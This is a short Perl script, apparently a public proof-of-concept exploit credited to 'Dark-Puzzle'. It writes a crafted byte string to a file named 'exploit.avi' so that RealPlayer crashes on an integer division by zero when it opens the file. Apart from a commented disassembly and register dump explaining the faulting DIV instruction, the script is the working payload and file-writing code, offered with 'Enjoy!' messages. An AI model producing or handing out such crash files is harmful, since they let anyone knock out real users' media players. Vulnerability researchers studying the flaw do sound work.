#------------------------------------------------------------------------#
#                                                                        #
#                     Usage : perl realplayer.pl                         #
#                                                                        #
#------------------------------------------------------------------------#

my $h ="\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00 
\x9b\x0e\xf3\xf8\xdb\xa7\x3b\x6f\xc8\x16\x08\x7f\x88\xa2\xf9\xcb
\x87\xab\x7f\x17\xa9\x9f\xa1\xb9\x98\x8e\x2b\x87\xcb\xf9\xbe\x50 
\x42\x99\x11\x26\x5c\xb6\x79\x44\xec\xe2\xee\x71\xd0\x5b\x50\x4e 
\x37\x34\x3d\x55\xc8\x2c\x4f\x28\x9a\xea\xd0\xc7\x6d\xca\x47\xa2 
\x07\xda\x51\xb7\x97\xe6\x1c\xd5\xd8\x32\xf9\xb1\x04\xa7\x08\xb2 
\xe9\xfb\xb5\x1a\xb7\xa7\x7a\xa6\xf9\xf6\xc9\x93\x91\xa1\x21\x29 
\xa3\x1c\xe3\xc7\xcb\x17\xfd\x8d\x65\xfd\x81\x61\x6b\x89\xaf\x53 
\x31\x45\x0c\x71\xcb\x93\xcb\x6e\x2a\xcf\xa6\x76\x1a\xa8\xcc\xad 
\x81\xfd\xc4\x56\xa7\x82\xda\x3d\x20\x80\xff\x4c\xbe\xc0\x4c\x61
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x06\x00\x00\x00\xff"; 


#[Disassembly] 
#"\x0C\x20\x87\x74"               PUSH EBX
#"\x0D\x20\x87\x74"               MOV EAX,DWORD PTR SS:[EBP+8]
#"\x10\x20\x87\x74"               MOV EBX,DWORD PTR SS:[EBP+C]
#"\x13\x20\x87\x74"               MOV ECX,DWORD PTR SS:[EBP+10]
#"\x16\x20\x87\x74"               MUL EBX
#"\x18\x20\x87\x74"               MOV EBX,ECX
#"\x1A\x20\x87\x74"               SHR EBX,1
#"\x1C\x20\x87\x74"               ADD EAX,EBX
#"\x1E\x20\x87\x74"               ADC EDX,0
#"\x21\x20\x87\x74"               DIV ECX <<---- As we see we can't devise by Zero .So this occurs an error and the program crashes here .

#[Registers]
#EAX 00000000
#ECX 00000000
#EDX 00000000
#EBX 00000000

# error : Integer Division by Zero ---> Exception handling vulnerability .

# This Exception handling can lead to a DOS attack . However The Concept of using this vulnerability is the create an exception so the program crashes.And it's a local exploit .




my $file = "exploit.avi";

open ($File, ">$file");
print $File $h;
close ($File);
print "0/// Exploit By Dark-Puzzle !                  \n";
print "1/// Follow me : http://fb.me/dark.puzzle      \n";
print "0/// avi file Created Enjoy!                   \n";
print "N.B : If the program says to locate the file just browse into it's directory and select it , if not , Enjoy\n";

# End Of Exploit 
#--------------------
